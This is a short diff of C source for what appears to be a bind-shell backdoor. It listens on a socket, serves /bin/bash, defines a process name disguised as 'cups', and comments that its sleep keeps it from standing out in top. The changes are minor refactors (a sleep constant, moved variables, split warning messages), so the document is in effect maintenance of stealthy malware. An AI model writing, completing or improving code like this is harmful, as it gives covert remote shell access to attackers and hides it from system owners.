@@ -16,7 +16,7 @@
 #define HIDE "cups"
 #define SH "/bin/bash"
 #define LISTN 5
-
+#define TIME_TO_SLEEP 5
 int main(int argc, char **argv)
 {
 
@@ -29,6 +29,7 @@ char *instr2	= "FOR TEMPORARY USE ONLY\n";
 int net_out, net_in, size; 
 
 int P = 123; // for the love of anything holy change this
+int allow_non_root_use = 0;
 
 struct sockaddr_in home;
 struct sockaddr_in away;
@@ -41,12 +42,10 @@ bzero(&(home.sin_zero),8);
  //////////////////////End of declerations///////////////////////////
 ////////////////////////////////////////////////////////////////////
 
-
-int allow_non_root_use = 0;
-
-if (allow_non_root_use == 1)	
+if(allow_non_root_use == 1)
 {
-	printf("WARNING:\nrunning this as a non-privlidged user\ncauses it to function in unexpected ways, you have been warned\n");
+	printf("WARNING:\nrunning this as a non-privlidged user\n");
+	printf("causes it to function in unexpected ways, you have been warned\n");
 }
 if (allow_non_root_use == 0)
 {
@@ -99,7 +98,7 @@ for(;;)
   {
   /* this sleep limits the infinite for loop so it doesn't 
    * show so high on the command top*/
-  sleep(5);
+  sleep(TIME_TO_SLEEP);
  
   if((net_in=accept(net_out,(struct sockaddr *)&away, &size))<0)
     exit(printf("Accept error"));
